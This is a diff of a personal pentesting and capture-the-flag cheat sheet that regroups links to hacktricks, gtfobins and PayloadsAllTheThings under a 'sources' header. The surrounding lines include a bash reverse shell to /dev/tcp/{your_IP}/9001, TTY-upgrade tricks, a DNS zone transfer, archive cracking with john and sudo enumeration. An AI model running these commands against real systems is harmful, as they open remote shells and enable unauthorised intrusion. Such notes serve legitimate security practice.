@@ -1,4 +1,16 @@
-dig axfr <hostname> @<hostip>                         # DNS zone transfer
+####################### sources ###################
+revshells.com                                                                     # shells generator
+https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys  #interactive bash fully TTY
+https://gtfobins.github.io/                                                       # bypass local security restrictions in Linux
+
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection    #SSTi inj
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection 
+
+
+####################################################################################
+
+
+dig axfr <hostname> @<dns/hostip>                     # DNS zone transfer
 curl <hostname> -I                                    # Get response header
 
 python3 -m http.server 8000                           # strat simple python3 server on 8000 port
@@ -8,7 +20,7 @@ zip2john \ rar2john                                   # crack archives  via john
 
 bash -c "bash -i >& /dev/tcp/{your_IP}/9001 0>&1"      # revers bash via "nc -lvnp 9001"
 
-https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys  #interactive bash fully TTY
+
 ###make bash interactive###########################################################
 python3 -c 'import pty;pty.spawn("/bin/bash")'        # shell via python
 CTRL+Z
@@ -27,8 +39,6 @@ script -qc /bin/bash /dev/null
 sudo -l                                               # check aviable commands
 
 
-https://gtfobins.github.io/                           # bypass local security restrictions in Linux
 
 
-https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection   #SSTi inj
-https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection 
+
